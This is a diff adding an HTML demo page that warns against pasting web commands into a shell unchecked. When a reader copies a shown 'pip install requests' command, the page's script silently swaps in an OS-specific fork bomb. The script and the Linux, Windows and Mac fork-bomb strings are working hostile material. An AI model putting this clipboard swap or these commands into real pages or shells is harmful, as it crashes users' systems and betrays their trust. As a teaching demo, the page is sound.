@@ -1,0 +1,66 @@
+<html>
+
+<head>
+    <title>Why you should not copy paste commands from web</title>
+</head>
+
+<body>
+    <h2>Why you should not directly copy commands from webpages and paste in shell without checking.</h2>
+    <p>Ranging from following tutorials to wanting to see that colorful christmas tree, we copy-paste commands from web into command-line. But do you always check if the command you copied, is really the command you saw in the webpage?</p>
+    <p>Nothing really sinks in until we see a example. So, let's try now.</p>
+    <p>Most of you can identify the command below. If you don't, this is a simple and harmless command that installs the requests library in Python. Now, try copying it.</p>
+    <div id="cde">
+        <code>pip install requests</code>
+    </div>
+    <p>Copied? Good. Now try pasting it in the below text box and see for yourself.</p>
+    <input type="text">
+    <br>
+    <p> Shocked? Wondering what this is? This is what you call a <a href="https://en.wikipedia.org/wiki/Fork_bomb" target="_blank">Fork Bomb.</a> </p>
+    <p> Executing this will crash your system temporarily and force you to restart it. This does not cause permanent harm but it is undesirable.</p>
+    <p> And to make matters worse, this page is dynamic. That is, you get a fork bomb depending on "your" computer's OS, thus affecting user's from all the three major platforms. (See <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent"
+            target="_blank">User-Agent</a> to know how the page know's your OS) </p>
+    <br>
+    <p> So, I hope you have learned the lesson to <b>"Never Copy and Paste commands from webpages without verifying"</b>. <br><br> And manually typing the command can also help you learn the command you are copying and might make you interested in learning
+        about what it does internally! :D </p>
+</body>
+
+<script>
+    function getOS() {
+        var userAgent = window.navigator.userAgent,
+            platform = window.navigator.platform,
+            macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K', 'darwin'],
+            windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
+            iosPlatforms = ['iPhone', 'iPad', 'iPod'],
+            os = null;
+
+        if (macosPlatforms.indexOf(platform) !== -1) {
+            os = 'Mac';
+        } else if (iosPlatforms.indexOf(platform) !== -1) {
+            os = 'iOS';
+        } else if (windowsPlatforms.indexOf(platform) !== -1) {
+            os = 'Windows';
+        } else if (/Android/.test(userAgent)) {
+            os = 'Android';
+        } else if (!os && /Linux/.test(platform)) {
+            os = 'Linux';
+        }
+        return os;
+    }
+
+    const cdeCode = document.getElementById("cde");
+    cdeCode.addEventListener("copy", function(event) {
+        var os = getOS();
+        if (os === "Linux") {
+            event.clipboardData.setData("text/plain", ":(){ :|:& };:")
+        }
+        if (os === "Windows") {
+            event.clipboardData.setData("text/plain", "%0|%0")
+        }
+        if (os === "Mac") {
+            event.clipboardData.setData("text/plain", 'perl -e "fork while fork" &')
+        }
+        event.preventDefault();
+    })
+</script>
+
+</html>
